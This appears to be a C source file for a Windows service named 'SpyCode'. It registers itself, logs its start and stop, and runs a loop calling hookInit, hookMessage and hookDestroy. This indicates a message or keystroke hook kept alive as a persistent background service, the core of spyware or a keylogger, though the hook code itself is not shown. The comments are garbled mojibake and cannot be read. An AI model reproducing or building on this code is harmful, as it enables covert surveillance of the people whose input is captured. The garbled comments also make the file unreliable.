/*
* �������⣺���Ӻ�windows������ͬʱ����
*			�����з���ʱ�������ܹ�����ע��
*			����ȴ��ִ�лص��������������Ϊ
*			ϵͳ��Ȩ�����⣬���Է��񷽰�����
*/
#include "service.h"

SERVICE_STATUS ServiceStatus;  // ����״̬  
SERVICE_STATUS_HANDLE hStatus; // ����״̬���  

// Service initialization  
int InitService(){
	if(logCheckFile()){
		OutputDebugString("initialization failed");
		logToFile("========== SERVICE FAILED ==========");
		return -1;
	}
	OutputDebugString("SpyCode process started...");
	logToFile("========== SERCIVE STARTED ==========");
	return 0;
}

// Control Handler  
void ControlHandler(DWORD request){
	switch(request){
	case SERVICE_CONTROL_STOP:
		OutputDebugString("SpyCode process stoped...");
		logToFile("========== SERVICE STOPED ==========");
		ServiceStatus.dwWin32ExitCode = 0;   
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;   
        SetServiceStatus(hStatus,&ServiceStatus);  
		return;
	default:
		break;
	}
	//���浱ǰ����״̬
	SetServiceStatus(hStatus,&ServiceStatus);  
	return;
}

void ServiceMain(int argc, char** argv){
	int error;
	ServiceStatus.dwServiceType = SERVICE_WIN32;	//���÷�������Ϊwin32����
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;	//���÷���ǰ״̬
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;//����ֹͣ����������� 

	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	
	hStatus= RegisterServiceCtrlHandler("SpyCode",(LPHANDLER_FUNCTION)ControlHandler);	//ע����ƺ������
	if (hStatus==(SERVICE_STATUS_HANDLE)0)
	{
		return;
	}
	//�����ʼ������
	error = InitService();
	if (error){		//��ʼ��ʧ�������õ�ǰ����״̬�Լ��������
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;   
        ServiceStatus.dwWin32ExitCode = -1;   
        SetServiceStatus(hStatus, &ServiceStatus);   
        return;   
	}
	//��ʼ���з���
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;  
    SetServiceStatus(hStatus,&ServiceStatus);

	hookInit();
	while(ServiceStatus.dwCurrentState == SERVICE_RUNNING){
		hookMessage();
	}
	hookDestroy();
}

